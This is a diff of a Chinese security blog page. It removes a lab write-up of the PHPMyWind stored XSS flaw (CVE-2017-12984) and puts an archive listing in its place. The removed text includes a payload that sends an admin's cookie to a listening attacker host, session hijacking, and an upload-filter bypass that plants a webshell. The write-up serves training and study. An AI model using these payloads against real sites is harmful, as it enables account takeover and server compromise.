@@ -3,46 +3,19 @@
 <head>
     <meta charset="utf-8">
     
-    <title>PHPMyWind存储XSS漏洞（CVE-2017-12984） | CiaoFox</title>
+    <title>归档: 2022/3 | CiaoFox</title>
     
     
-        <meta name="keywords" content="漏洞复现,XSS" />
+        <meta name="keywords" content="CiaoFox" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="本文复现了CVE-2017-12984,一个基础的XSS漏洞。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHPMyWind存储XSS漏洞（CVE-2017-12984）">
-<meta property="og:url" content="http://ciaofox.me/2019/09/22/400%20Execution%20%E6%94%BB%E5%87%BB/PHPMyWind%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12984%EF%BC%89/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="CiaoFox">
+<meta property="og:url" content="http://ciaofox.me/archives/2022/03/index.html">
 <meta property="og:site_name" content="CiaoFox">
-<meta property="og:description" content="本文复现了CVE-2017-12984,一个基础的XSS漏洞。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/ywYAg9VUeKvPMm4.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/38FZPzhaYJqSfUy.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/BOJkRPfbq8jAgrT.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/lGq8wkSULNCuTAb.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/1m7QwIyrYOEvHDS.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/m4UPFHiduzYOpSv.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/YBten3CwdEWiFSJ.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/wDvgJfV8Gj1XnIR.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/NrenUb7gKXxVfD2.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/DOml23aT7LnCSFt.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/As9vg2Ef6ybXjZw.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/7JoQLuw8sieYEHN.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/Ly1xRYNAOcjCiob.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/tmQECKurnRJeA2N.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/kvEKj7pMVZfthgH.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/uT8SmMJcEFs7xIt.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/uRxAnHrsfmoZ3cJ.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/QmbG3kLjiHEpd9c.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/qavsEwB17tNrhOA.png">
-<meta property="og:image" content="https://i.loli.net/2021/08/03/9Xh5ZUw6jHGezbA.png">
-<meta property="article:published_time" content="2019-09-22T03:05:32.000Z">
-<meta property="article:modified_time" content="2022-03-15T09:23:47.885Z">
 <meta property="article:author" content="CiaoFox">
-<meta property="article:tag" content="漏洞复现">
-<meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/08/03/ywYAg9VUeKvPMm4.png">
     
 
     
@@ -258,13 +231,13 @@
         
         
          <ul class="unstyled" id="tree" > 
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
-                            <i class="fa fa-folder-open"></i>
+                            <i class="fa fa-folder"></i>
                             &nbsp;
                             400 Execution 攻击
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/10/31/400%20Execution%20%E6%94%BB%E5%87%BB/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">渗透记录之路径遍历</a></li>  <li class="file active"><a href="/2019/09/22/400%20Execution%20%E6%94%BB%E5%87%BB/PHPMyWind%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12984%EF%BC%89/">PHPMyWind存储XSS漏洞（CVE-2017-12984）</a></li>  <li class="file"><a href="/2019/10/11/400%20Execution%20%E6%94%BB%E5%87%BB/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0708%EF%BC%89/">windows远程桌面漏洞(CVE-2019-0708)</a></li>  <li class="file"><a href="/2020/03/03/400%20Execution%20%E6%94%BB%E5%87%BB/Apache%20Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/">Apache Tomcat文件包含漏洞（CVE-2020-1938）</a></li>  <li class="file"><a href="/2021/12/13/400%20Execution%20%E6%94%BB%E5%87%BB/%E9%9B%AA%E5%B4%A9-log4j%E6%BC%8F%E6%B4%9E%E7%B2%97%E8%B0%88/">雪崩-log4j漏洞粗谈</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/10/31/400%20Execution%20%E6%94%BB%E5%87%BB/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95%E4%B9%8B%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">渗透记录之路径遍历</a></li>  <li class="file"><a href="/2019/09/22/400%20Execution%20%E6%94%BB%E5%87%BB/PHPMyWind%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12984%EF%BC%89/">PHPMyWind存储XSS漏洞（CVE-2017-12984）</a></li>  <li class="file"><a href="/2019/10/11/400%20Execution%20%E6%94%BB%E5%87%BB/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0708%EF%BC%89/">windows远程桌面漏洞(CVE-2019-0708)</a></li>  <li class="file"><a href="/2020/03/03/400%20Execution%20%E6%94%BB%E5%87%BB/Apache%20Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/">Apache Tomcat文件包含漏洞（CVE-2020-1938）</a></li>  <li class="file"><a href="/2021/12/13/400%20Execution%20%E6%94%BB%E5%87%BB/%E9%9B%AA%E5%B4%A9-log4j%E6%BC%8F%E6%B4%9E%E7%B2%97%E8%B0%88/">雪崩-log4j漏洞粗谈</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -391,170 +364,57 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-400 Execution 攻击/PHPMyWind存储XSS漏洞（CVE-2017-12984）" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-        
-            <header class="article-header">
-                
-                    <div class="article-meta">
-                        
-    <div class="article-category">
-    	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/400-Execution-%E6%94%BB%E5%87%BB/">400 Execution 攻击</a>
-    </div>
-
-                        
-    <div class="article-tag">
-        <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
-    </div>
-
-                        
-    <div class="article-date">
-        <i class="fa fa-calendar"></i>
-        <a href="/2019/09/22/400%20Execution%20%E6%94%BB%E5%87%BB/PHPMyWind%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12984%EF%BC%89/">
-            <time datetime="2019-09-22T03:05:32.000Z" itemprop="datePublished">2019-09-22</time>
-        </a>
-    </div>
-
-
-                        
-                            <i class="fa fa-bar-chart"></i>
-                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
-                        
-                        
-                    </div>
-                
+            <section id="main"><div class="timeline timeline-wrap">
+    
+            <div class="timeline-row timeline-row-major">
+                <span class="node"><i class="fa fa-calendar-o"></i></span>
+                <h1 class="title"><a href="/archives/2022/">2022</a></h1>
+            </div>
+    
+            <div class="timeline-row timeline-row-major">
+                <span class="node"><i class="fa fa-calendar"></i></span>
+                <h1 class="title"><a href="/archives/2022/03/">2022-03</a><span class="archive-list-count">1</span></h1>
+            </div>
+    
+        <div class="timeline-row">
+            <span class="node"></span>
+            <div class="content">
                 
     
-        <h1 class="article-title" itemprop="name">
-            PHPMyWind存储XSS漏洞（CVE-2017-12984）
+        <h1 itemprop="name">
+            <a class="timeline-article-title" href="/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/">DirtyPipe（CVE-2022-0847）</a>
         </h1>
     
 
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
-        
-            
-        
-        
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文依托I春秋实验复现而成，链接：<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/course/60909">https://www.ichunqiu.com/course/60909</a>，使用了PHPMyWind存储XSS漏洞（CVE-2017-12984）。</p>
-<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>了解PHPMyWind漏洞的危害</p>
-<p>学习漏洞代码的分析</p>
-<p>掌握PHPMyWind漏洞的验证</p>
-<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>操作机：Windows XP</p>
-<p>IP：172.16.11.2</p>
-<p>目标网址：<a target="_blank" rel="noopener" href="http://www.test.ichunqiu:8080/">http://www.test.ichunqiu:8080/</a></p>
-<p>工具下载地址：file.ichunqiu.com/ak4798ka/</p>
-<h1 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h1><p>Firebug:FireFox浏览器下的插件，集HTML查看和编辑、Javascript控制台、网络状况监视器于一体，是开发JavaScript、CSS、HTML和Ajax的得力助手，本实验使用其修改Cookie功能</p>
-<p>Burp suite: Burp Suite 是用于测试web<br>应用程序的集成平台,本实验主要使用其抓包、改包、发包功能</p>
-<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="步骤1-漏洞验证"><a href="#步骤1-漏洞验证" class="headerlink" title="步骤1:漏洞验证"></a>步骤1:漏洞验证</h2><p>首先我们来看一下源码，处理客户留言内容的关键代码在message.php文件的第29行和34行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\$content = htmlspecialchars(\$content);  </span><br><span class="line"></span><br><span class="line">\$sql = \&amp;quot;INSERT INTO \`\#\@__message\` (siteid, nickname, contact,</span><br><span class="line">content, orderid, posttime, htop, rtop, checkinfo, ip) VALUES (1, &#x27;\$nickname&#x27;,</span><br><span class="line">&#x27;\$contact&#x27;, &#x27;\$content&#x27;, &#x27;\$orderid&#x27;, &#x27;\$posttime&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;false&#x27;,</span><br><span class="line">&#x27;\$ip&#x27;)\&amp;quot;;</span><br></pre></td></tr></table></figure>
-
-<p>我们先看content参数，程序会使用htmlspecialchars() 函数把预定义的字符 “&amp;lt;”<br>（小于）和 “&amp;gt;” （大于）转换为 HTML<br>实体，进行过滤，然后存储至数据库中，这里并没有问题。</p>
-<p>然后，我们再看看管理员修改留言的处理方式，代码在admin/<br>message_update.php文件的第26行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&amp;lt;td&amp;gt;&amp;lt;input type=\&amp;quot;text&amp;quot; name=\&amp;quot;content&amp;quot;</span><br><span class="line">id=\&amp;quot;content&amp;quot; class=\&amp;quot;input&amp;quot; value=\&amp;quot;&amp;lt;?php echo</span><br><span class="line">\$row[&#x27;content&#x27;] ?\&amp;gt;&amp;quot; /\&amp;gt;&amp;lt;/td&amp;gt;</span><br></pre></td></tr></table></figure>
-
-<p>管理员编辑留言，编辑器直接读取content内容并显示，却并未进行转义操作，所以导致存储型XSS漏洞的出现。</p>
-<p>上面已经分析了漏洞的成因，接下来，我们开始验证这个漏洞。</p>
-<p>首先，访问file.ichunqiu.com/ak4798ka/下载实验文件，方便后续操作</p>
-<p>然后，使用桌面的Firefox浏览器打开<a target="_blank" rel="noopener" href="http://www.test.ichunqiu:8080/">http://www.test.ichunqiu:8080/</a> ，访问网站首页。</p>
-<p><img src="https://i.loli.net/2021/08/03/ywYAg9VUeKvPMm4.png"></p>
-<p>对其进行添加留言操作（留言部分内部是简单的XSS语句）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&amp;lt;img src=x onerror = alert(666); \&amp;gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/08/03/38FZPzhaYJqSfUy.png"></p>
-<p>留言成功。</p>
-<p><img src="https://i.loli.net/2021/08/03/BOJkRPfbq8jAgrT.png"></p>
-<p>下一步我们从另一个浏览器登录进入后台页面。</p>
-<p><img src="https://i.loli.net/2021/08/03/lGq8wkSULNCuTAb.png"></p>
-<p>登录成功。</p>
-<p><img src="https://i.loli.net/2021/08/03/1m7QwIyrYOEvHDS.png"></p>
-<p>接下来我们尝试查看漏洞。</p>
-<p><img src="https://i.loli.net/2021/08/03/m4UPFHiduzYOpSv.png"></p>
-<p>查看成功，触发XSS。</p>
-<p><img src="https://i.loli.net/2021/08/03/YBten3CwdEWiFSJ.png"></p>
-<h2 id="步骤2-利用XSS获取cookie"><a href="#步骤2-利用XSS获取cookie" class="headerlink" title="步骤2:利用XSS获取cookie"></a>步骤2:利用XSS获取cookie</h2><p>首先我们利用第三条语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&amp;lt;img src=x onerror =</span><br><span class="line">document.body.appendChild(document.createElement(&#x27;img&#x27;)).setAttribute(&#x27;src&#x27;,&#x27;http://172.16.11.2:8888/?=&#x27;+document.cookie);</span><br><span class="line">\&amp;gt;</span><br></pre></td></tr></table></figure>
-
-<p>这条语句的作用主要在于将cookies回弹回来。</p>
-<p>上传过程不再赘述。</p>
-<p>打开nc.exe 通过目标端口监听。当对方管理员触发该XSS时，cookie将回弹回来。</p>
-<p><img src="https://i.loli.net/2021/08/03/wDvgJfV8Gj1XnIR.png"></p>
-<p>监听成功，将cookie存下。</p>
-<p><img src="https://i.loli.net/2021/08/03/NrenUb7gKXxVfD2.png"></p>
-<p>回到攻击者的浏览器，我们将cookie导入。</p>
-<p><img src="https://i.loli.net/2021/08/03/DOml23aT7LnCSFt.png"></p>
-<p><img src="https://i.loli.net/2021/08/03/As9vg2Ef6ybXjZw.png"></p>
-<p>刷新之后可以直接进入管理员网页。</p>
-<p><img src="https://i.loli.net/2021/08/03/7JoQLuw8sieYEHN.png"></p>
-<h2 id="步骤3-扩大战果"><a href="#步骤3-扩大战果" class="headerlink" title="步骤3:扩大战果"></a>步骤3:扩大战果</h2><p>当进入后台页面之后，我们需要扩大战果，可以考虑利用菜刀连接进入。</p>
-<p>检查上传设置。一般来说网页都会禁止上传php文件，但是我们可以利用图片上传绕过。</p>
-<p><img src="https://i.loli.net/2021/08/03/Ly1xRYNAOcjCiob.png"></p>
-<p>将bmp格式改为php 文件。（php后面有个空格）这样上传图片之后会对其进行重命名并且加入后缀。</p>
-<p><img src="https://i.loli.net/2021/08/03/tmQECKurnRJeA2N.png"></p>
-<p>编写一个带有一句话木马的文件并且更名为png格式。</p>
-<p>开始准备上传。</p>
-<p><img src="https://i.loli.net/2021/08/03/kvEKj7pMVZfthgH.png"></p>
-<p>这里我们利用burpsuite代理模式，监视每一个包。</p>
-<p><img src="https://i.loli.net/2021/08/03/uT8SmMJcEFs7xIt.png"></p>
-<p>对上传包进行修改，后缀改为.php 格式（php后面有个空格）。</p>
-<p><img src="https://i.loli.net/2021/08/03/uRxAnHrsfmoZ3cJ.png"></p>
-<p>上传成功后开启菜刀。</p>
-<p><img src="https://i.loli.net/2021/08/03/QmbG3kLjiHEpd9c.png"></p>
-<p>菜刀远程连接进网站。</p>
-<p><img src="https://i.loli.net/2021/08/03/qavsEwB17tNrhOA.png"></p>
-<p>连接成功。</p>
-<p><img src="https://i.loli.net/2021/08/03/9Xh5ZUw6jHGezbA.png"></p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42535/">https://www.exploit-db.com/exploits/42535/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/sectool/159689.html">http://www.freebuf.com/sectool/159689.html</a></p>
-
-            </div>
-        
-        <footer class="article-footer">
-        </footer>
+                
+                <div class="article-meta">
+                    
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/">
+            <time datetime="2022-03-10T05:11:23.000Z" itemprop="datePublished">2022-03-10</time>
+        </a>
     </div>
-</article>
 
 
-    
-<nav id="article-nav">
-    
-        <a href="/2019/09/25/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%88CVE-2017-16995%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">上一篇</strong>
-            <div class="article-nav-title">
-                
-                    Ubuntu本地提权（CVE-2017-16995）
+                    
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/600-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">600 Privilege Escalation 权限提升</a>
+    </div>
+
+                    
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" rel="tag">原理分析</a>, <a class="tag-link-link" href="/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="tag">提权漏洞</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+                </div>
                 
             </div>
-        </a>
+        </div>
     
-    
-        <a href="/2018/12/25/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B9%8BMQTT%E5%8D%8F%E8%AE%AE/" id="article-nav-older" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">下一篇</strong>
-            <div class="article-nav-title">协议分析之MQTT协议</div>
-        </a>
-    
-</nav>
-
-
-
-
-
-    
-    
-
-
-
-
-<!-- baidu url auto push script -->
-<script type="text/javascript">
-    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
-</script>     
+</div>
 </section>
         </div>
         <footer id="footer">
